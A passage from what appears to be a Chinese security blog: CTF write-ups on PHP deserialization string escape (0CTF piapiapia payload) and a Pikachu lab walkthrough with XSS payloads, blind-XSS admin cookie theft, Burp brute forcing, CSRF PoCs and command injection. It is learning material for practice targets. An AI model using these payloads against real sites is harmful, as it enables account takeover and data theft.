class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line">	<span class="comment">// echo file_get_contents(base64_decode($userinfo[&#x27;img&#x27;]));</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$serialize_info</span>;</span><br><span class="line"><span class="comment">#a:2:&#123;s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;</span></span><br><span class="line"><span class="comment">s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="comment">#a:2:&#123;s:7:&quot;phpflag&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>构造的序列化串为<code>;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;phpflag&#x27;</span>] = <span class="string">&#x27;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>由于是由<code>extract($_POST)</code>重新设置的变量，最终<code>payload</code>为<br><code>_SESSION[phpflag]=;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</code></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202502060204888.png" alt="image-20241118231728369" style="zoom:50%;" />

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202502060204435.png" alt="image-20241118231700590" style="zoom:50%;" />

<p><code>/d0g3_fllllllag</code>里应该就是<code>flag</code>了，将<code>payload</code>中的<code>ZDBnM19mMWFnLnBocA==</code>替换成<code>L2QwZzNfZmxsbGxsbGFn</code>即可。</p>
<h2 id="增长逃逸"><a href="#增长逃逸" class="headerlink" title="增长逃逸"></a>增长逃逸</h2><p>通过下面这个例子学习一下：</p>
<p>不能对<code>$pass</code>进行改动，要求输出<code>hack</code>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;bb&#x27;</span>, <span class="string">&#x27;ccc&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:4:&quot;hack&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">//     public $name = &#x27;aaa&#x27;;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pass</span>=<span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$AA</span>=<span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$AA</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="variable">$res</span>=<span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$AA</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$res</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>-&gt;pass;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&#x3D;&#x3D;[0CTF 2016]piapiapia&#x3D;&#x3D;</p>
<p>关键代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>] &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) || <span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">        <span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">update_profile</span>(<span class="variable">$username</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$profile</span>));</span><br><span class="line">    &#125;</span><br><span class="line">------------------------------------------------------------------------------------</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">    <span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">    <span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#------------------------profile.php----------------------------</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$profile</span>=<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">show_profile</span>(<span class="variable">$username</span>);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$profile</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$profile</span>);</span><br><span class="line">        <span class="variable">$phone</span> = <span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">        <span class="variable">$email</span> = <span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">        <span class="variable">$nickname</span> = <span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">        <span class="variable">$photo</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show_profile</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$username</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$object</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">select</span>(<span class="variable">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$object</span>-&gt;profile;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h3><p>​	序列化后，紧接着就是对序列化字符串进行过滤，想到反序列化字符逃逸漏洞，<code>where-&gt;hacker</code>本题是增长逃逸。</p>
<p>​	利用数组绕过<code>preg_match</code>对<code>nickname</code>的检查，传入<code>nickname[]</code>即可。</p>
<p>因为前面是<strong>数组</strong>，所以闭合方式由<code>&quot;;</code>变成了**<code>&quot;;&#125;</code>**，因此也要多加一个<code>where</code>，最后的<code>payload</code>如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere</span><br><span class="line">&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br><span class="line"></span><br><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere</span><br><span class="line">&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="注："><a href="#注：" class="headerlink" title="注："></a><strong>注</strong>：</h3><p>​	拿到了后门文件后发现<code>www</code>目录下有许多<code>.php</code>文件，但是依然没有任何思路，傻傻的分析这些代码还以为是<code>sql</code>注入🙃。看<code>wp</code>才知道要访问一下这些文件的路由，其实分析代码的时候也能看出来这些<code>.php</code>文件都是可以访问的。</p>
<p>​	这道题思路<code>payload</code>都没问题后，还是一直打不通，换了两个<code>bp</code>三个浏览器，<code>Hackbar</code>也尝试过，都失败了😭。解决过程：<br>经过不同的测试后发现可能是<code>bp</code>里虽然修改了，但是提交的数据还是原来的内容，我还一直以为是我<code>bp</code>的问题。最后发现其实是将数据包发送到<code>Repeater</code>后的修改无效😅，真离谱。所以抓包后要先修改内容，再把数据包发送到<code>Repeater</code>，这样的修改才是有效的。</p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>php反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>pikachu靶场通关记录</title>
    <url>/2024/10/17/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>Pikachu靶场是一个用于学习和测试网络安全的练习平台，主要用于Web安全漏洞的实践和研究。它包含了一系列常见的Web安全漏洞。</p>
<span id="more"></span>

<h2 id="Brute-Force暴力破解"><a href="#Brute-Force暴力破解" class="headerlink" title="Brute Force暴力破解"></a><code>Brute Force</code>暴力破解</h2><h3 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h3><p>直接爆破</p>
<h3 id="验证码绕过-on-server"><a href="#验证码绕过-on-server" class="headerlink" title="验证码绕过(on server)"></a>验证码绕过(<code>on server</code>)</h3><p>这种同上面一样，直接爆破</p>
<h3 id="验证码绕过-on-client"><a href="#验证码绕过-on-client" class="headerlink" title="验证码绕过(on client)"></a>验证码绕过(<code>on client</code>)</h3><p>填写正确的验证码后劫持请求包，在<code>Repeater</code>模块中将验证码参数设置为空后发送，服务器返回正常信息，</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131758776.png" alt="image-20241011155625971" style="zoom:50%;" />

<p>然后将请求包发送到<code>Intruder</code>模块，正常暴力破解即可。</p>
<h3 id="token防爆破"><a href="#token防爆破" class="headerlink" title="token防爆破"></a><code>token</code>防爆破</h3><p>这种抓包后，可以发现多了一个<code>token</code>参数，需要同时爆破两个参数，可以利用<code>Pitchfork</code>攻击模式。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131801378.png" alt="image-20241011160629228" style="zoom:50%;" />

<p><code>password</code>的<code>payload</code>设置正常加载字典，<code>token</code>的<code>payload</code>设置为<code>Recursive grep</code>（递归搜索）类型</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131758117.png" alt="image-20241011161617335" style="zoom: 67%;" />

<p>在<code>Options</code>模块下：</p>
<p>在<code>Request Engine</code>中设置线程数为<code>1</code></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131758854.png" alt="image-20241011161720097" style="zoom:67%;" />

<p>在<code>Grep-Extract</code>中提取响应中的有用信息，到攻击结果表中，这里是<code>token</code>值</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757965.png" alt="image-20241011161903701" style="zoom:50%;" />

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757206.png" alt="image-20241011162304789" style="zoom:50%;" />

<p>在<code>Redirections</code>中设置如何遵循重定向为<code>Always</code></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757337.png" alt="image-20241011162347048" style="zoom:50%;" />

<p>然后开始爆破</p>
<h2 id="XSS跨站脚本"><a href="#XSS跨站脚本" class="headerlink" title="XSS跨站脚本"></a><code>XSS</code>跨站脚本</h2><h3 id="漏洞测试流程"><a href="#漏洞测试流程" class="headerlink" title="漏洞测试流程"></a><strong>漏洞测试流程</strong></h3><ol>
<li>在目标站点找到输入点，比如查询接口，留言板等；</li>
<li>输入一组“特殊字符+唯一识别字符”，点击提交后，查看返回的源码，是否有做对应的处理。</li>
<li>通过搜索定位到唯一字符，结合唯一字符前后语法确认是否可以构造执行JS代码的条件（构造闭合），是否在<code>p</code>标签中；</li>
<li>提交payload，成功执行则存在xss漏洞。</li>
</ol>
<h3 id="反射型xss-get"><a href="#反射型xss-get" class="headerlink" title="反射型xss(get)"></a>反射型<code>xss(get)</code></h3><p>​	先输入<code>&lt;script&gt;111</code>提交，然后查看源码，搜索找到输入的<code>&lt;script&gt;111</code>，联系上下文可以确定这是一个<code>xss</code>漏洞。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757469.png" alt="image-20241011191329652" style="zoom: 50%;" />

<p>试着输入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，发现输入字节数被限制。<br><code>F12</code>找到设置字数的参数<code>maxlength</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757274.png" alt="image-20241011192735750"></p>
<p>修改<code>maxlength</code>值</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131802005.png" alt="image-20241011192958868" style="zoom:67%;" />

<p>再次注入代码</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757113.png" alt="image-20241011193044360" style="zoom: 50%;" />

<h5 id="payload："><a href="#payload：" class="headerlink" title="payload："></a><code>payload</code>：</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_ invoke__">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br><span class="line">&lt;svg/onload=<span class="title function_ invoke__">confirm</span>(<span class="number">1</span>)&gt;</span><br><span class="line">&lt;img src=<span class="number">1</span> onerror=<span class="title function_ invoke__">alert</span>(<span class="number">3</span>)&gt;</span><br></pre></td></tr></table></figure>

<p>反射型<code>xss(post)</code>与<code>get</code>型的区别是，<code>get</code>会在<code>url</code>中显示我们注入的代码，该类不会显示。</p>
<h3 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型<code>xss</code></h3><p>​	存储型与反射型的区别在于，存储型会将每次输入的数据都保留在数据库中，后一次输入的数据不会覆盖前一次输入的数据。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131802917.png" alt="image-20241011195802223" style="zoom:67%;" />

<h3 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a><code>DOM</code>型<code>xss</code></h3><p>​	<code>DOM XSS</code>的<code>XSS</code>代码并不需要服务器解析响应的直接参与，触发<code>XSS</code>靠的就是浏览器端的<code>DOM</code>解析，可以认为完全是客户端的事情，无法通过<code>WAF</code>防护。</p>
<p>​	分析一下前端网页代码，可以发现输入框里的参数会被传递给<code>a</code>标签中的<code>href</code>属性，所以我们输入<code>payload</code>后点击<code>a</code>标签也就是网页上的<code>what do you see?</code>即可。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757494.png" alt="image-20241011214756139" style="zoom: 67%;" />

<ul>
<li><p>输入<code>javascript:alert(1)</code>，插入数据后的<code>a</code>标签为：<code>&lt;a href=&#39;javascript:alert(1)&#39;&gt;what do you see?&lt;/a&gt;</code>。</p>
</li>
<li><p>输入<code>&#39; onclick=&quot;alert(1)&quot;&gt;</code>，输入的<code>&#39;</code>会把<code>href</code>属性构造成一个闭合，然后再通过<code>onclick</code>也可以实现跟上面一样的功能。</p>
</li>
</ul>
<p>前：<code>&lt;a href=&#39;&#39;&gt;what do you see?&lt;/a&gt;</code><br>后：<code>&lt;a href=&#39;&#39; onclick=&quot;alert(&#39;1&#39;)&quot;&gt;&#39;&gt;what do you see?&lt;/a&gt;</code></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757771.png" alt="image-20241011220439496" style="zoom:67%;" />

<h4 id="payload：-1"><a href="#payload：-1" class="headerlink" title="payload："></a><code>payload</code>：</h4><figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="variable">javascript</span>:<span class="function"><span class="title">alert</span>(<span class="string">&quot;1&quot;</span>)</span></span><br><span class="line"><span class="string">&#x27; onclick=&quot;alert(&#x27;</span><span class="number">1</span><span class="string">&#x27;)&quot;&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="xss之盲打"><a href="#xss之盲打" class="headerlink" title="xss之盲打"></a><code>xss</code>之盲打</h3><blockquote>
<p>XSS盲打不是一种漏洞类型而是一种xss漏洞的利用方式，攻击者可以在网站留言板、反馈建议等功能点提交恶意的xss payload，如果该网站存在xss漏洞，当管理员在后台查看用户留言页面时就会执行xss payload，xss盲打最主要的目的是通过加载外部的恶意js文件(通过xss盲打平台生成)获取管理员后台的Cookie信息，攻击者就可以使用管理员的身份访问网站后台从而进一步发动攻击</p>
</blockquote>
<p>该类攻击的过程是找到<code>xss</code>漏洞的注入点，然后将通过<a href="https://xssaq.com/dashboard">XSS平台</a>得到的恶意<code>js</code>文件在漏洞点注入，登录管理员后台使恶意代码执行，便能在<code>XSS</code>平台上得到<code>cookie</code>值。</p>
<p>在<a href="https://xssaq.com/dashboard">XSS平台</a>上，创建项目，查看配置代码</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757528.png" alt="image-20241012170823583" style="zoom:50%;" />

<p>将第二个代码注入漏洞点，提交</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131804716.png" alt="image-20241012170947388" style="zoom:50%;" />

<p>注入恶意代码后，再次登录后台，代码就会被执行</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131805384.png" alt="image-20241012172214641" style="zoom:50%;" />

<p>然后在<code>XSS</code>平台上查看记录，要等一会儿才能看到</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757491.png" alt="image-20241012172423588" style="zoom:50%;" />

<p>然后就可以利用获得的<code>cookie</code>值登录管理后台了</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757454.png" alt="image-20241012172949880" style="zoom:50%;" />

<h3 id="xss之过滤"><a href="#xss之过滤" class="headerlink" title="xss之过滤"></a><code>xss</code>之过滤</h3><p><code>&lt;&gt;</code>可以正常打印出来</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757367.png" alt="image-20241012175326553"></p>
<p><code>&lt;script&gt;</code>被过滤</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131805565.png" alt="image-20241012175401883"></p>
<p>尝试双写<code>&lt;scrscriptipt&gt;</code>同样被过滤</p>
<p>尝试大小写<code>&lt;ScrIpt&gt;</code>，绕过成功</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757194.png" alt="image-20241012180032520"></p>
<p>猜测是<code>script</code>关键字被过滤，尝试<code>&lt;svg/onload=confirm(1)&gt;</code>和<code>&lt;img src=1 onerror=alert(3)&gt;</code>都可成功</p>
<h3 id="xss之htmlspecialchars"><a href="#xss之htmlspecialchars" class="headerlink" title="xss之htmlspecialchars"></a><code>xss</code>之<code>htmlspecialchars</code></h3><h4 id="htmlspecialchars"><a href="#htmlspecialchars" class="headerlink" title="htmlspecialchars"></a><code>htmlspecialchars</code></h4><p><code>htmlspecialchars</code>函数会把<code>&#39; &quot; &amp; &lt; &gt;</code>等字符转换为实体，也就是过滤了。但是该函数默认情况下是不会过滤<code>&#39;</code>的，只有<code>quotestyle</code>选项被设为<code>ENT_QUOTES</code>时才会过滤<code>&#39;</code>。</p>
<h4 id="标签和href属性"><a href="#标签和href属性" class="headerlink" title="&lt;a&gt;标签和href属性"></a><code>&lt;a&gt;</code>标签和<code>href</code>属性</h4><p> <code>&lt;a&gt;</code>是<code>&quot;anchor&quot;</code>的缩写，用于定义超链接，可以将用户导航到另一个页面、页面上的某个部分，或者任何其他<code>URL</code>。<code>href</code>属性指定了超链接的目标<code>URL</code>。</p>
<p>随便输入123，发现输入的数据给了<code>href</code>属性</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757581.png" alt="image-20241012184854479" style="zoom: 67%;" />

<p>那就先输入<code>javascript:alert(1)</code>试试，如果没有过滤，即可成功</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131805160.png" alt="image-20241012185644279" style="zoom:50%;" />

<p>成功了，我们还可以用其他<code>payload</code>，只要能绕过过滤即可</p>
<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a><code>payload</code></h4><figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="variable">javascript</span>:<span class="function"><span class="title">alert</span>(<span class="string">&#x27;1&#x27;</span>)</span></span><br><span class="line"><span class="string">&#x27; onclick=&#x27;</span><span class="function"><span class="title">alert</span>(<span class="number">2</span>)<span class="string">&#x27;</span></span></span><br></pre></td></tr></table></figure>

<h3 id="xss之href输出"><a href="#xss之href输出" class="headerlink" title="xss之href输出"></a><code>xss</code>之<code>href</code>输出</h3><p>直接用<code>javascript:alert(1)</code>即可。</p>
<h3 id="xss之js输出"><a href="#xss之js输出" class="headerlink" title="xss之js输出"></a><code>xss</code>之<code>js</code>输出</h3><p>输入123</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757943.png" alt="image-20241012190623893" style="zoom:50%;" />

<p>这里有一个小技巧，我们可以利用<code>&#39;</code>和<code>//</code>构造在<code>$ms=&#39;123&#39;</code>可以执行的语句。</p>
<p>输入<code>123&#39;;//</code>，拼接后：<code>$ms=&#39;123&#39;;//&#39;;</code></p>
<p>所以现在我们输入<code>123&#39;;alert(2);//</code>即可</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757000.png" alt="image-20241012191615734"></p>
<h2 id="CSRF跨站请求伪造"><a href="#CSRF跨站请求伪造" class="headerlink" title="CSRF跨站请求伪造"></a><code>CSRF</code>跨站请求伪造</h2><h3 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF(get)"></a><code>CSRF(get)</code></h3><p>攻击方：<code>vince</code><br>被攻击方：<code>allen</code><br>被攻击方原个人信息：</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757895.png" alt="image-20241022141942627" style="zoom:50%;" />

<h4 id="攻击方"><a href="#攻击方" class="headerlink" title="攻击方"></a>攻击方</h4><p>攻击方登录自己账号，点击修改个人信息</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131806543.png" alt="image-20241022142028237" style="zoom:50%;" />

<p>填入要修改的内容，点击<code>submit</code>并进行<code>bp</code>抓包</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757423.png" alt="image-20241022142718284" style="zoom:50%;" />

<p>可以发现，该页面是通过<code>GET</code>传参方式对数据进行修改的</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757399.png" alt="image-20241022142845195"></p>
<p>右键选中<code>Engagement tools-&gt;Generate CSRF PoC</code>，生成<code>CSRF Poc</code>代码</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757604.png" alt="image-20241022143336617" style="zoom:50%;" />

<p>点击<code>Test in browser</code>，复制<code>URL</code>，在浏览器打开</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131756736.png" alt="image-20241022143504559" style="zoom: 67%;" />

<p>将当前请求包<code>Drop</code>掉，关闭<code>bp</code>拦截，直接退出登录，<code>vince</code>信息并未被修改</p>
<h4 id="被攻击方"><a href="#被攻击方" class="headerlink" title="被攻击方"></a>被攻击方</h4><p>被攻击方<code>allen</code>登录自己账号，然后来到前面<code>burp</code>生成的网站，点击<code>Submit request</code>，此时被攻击方的个人信息已被成功修改</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131756730.png" alt="image-20241022144414264" style="zoom:50%;" />

<h3 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF(post)"></a><code>CSRF(post)</code></h3><p>该类与前类的区别在于，对于关键数据的传参方式不同，攻击过程同上</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131807839.png" alt="image-20241022144910205" style="zoom:50%;" />

<p>攻击成功，过程不再赘述</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131756346.png" alt="image-20241022145016235" style="zoom:50%;" />

<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a><code>RCE</code></h2><h3 id="exec-ping"><a href="#exec-ping" class="headerlink" title="exec&quot;ping&quot;"></a><code>exec&quot;ping&quot;</code></h3><p>通过一些命令连接符如<code>||,&amp;,&amp;&amp;</code>，来拼接<code>IP</code>地址和命令，执行我们想要执行的命令。</p>
<h3 id="exec-eval"><a href="#exec-eval" class="headerlink" title="exec&quot;eval&quot;"></a><code>exec&quot;eval&quot;</code></h3><p>这种是直接通过<code>eval()</code>将输入的字符串当作代码来执行。</p>
<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>文件包含函数：<code>include(),include_once(),require(),require_once()</code></p>
<h3 id="防范措施"><a href="#防范措施" class="headerlink" title="防范措施"></a><strong>防范措施</strong></h3><ul>
<li>在功能设计上尽量不要将文件包含函数对应的文件放给前端进行选择和操作。</li>
<li>过滤各种<code>./.</code>，<code>http://</code>，<code>https://</code></li>
<li>配置php.ini配置文件：<code>allow_ url_open = off</code>，<code>Allow_ url include= off</code>，<code>magic quotes_ gpc=on</code> <code> //gpc</code>在</li>
<li>通过白名单策略，仅允许包含运行指定的文件，其他的都禁止。</li>
</ul>
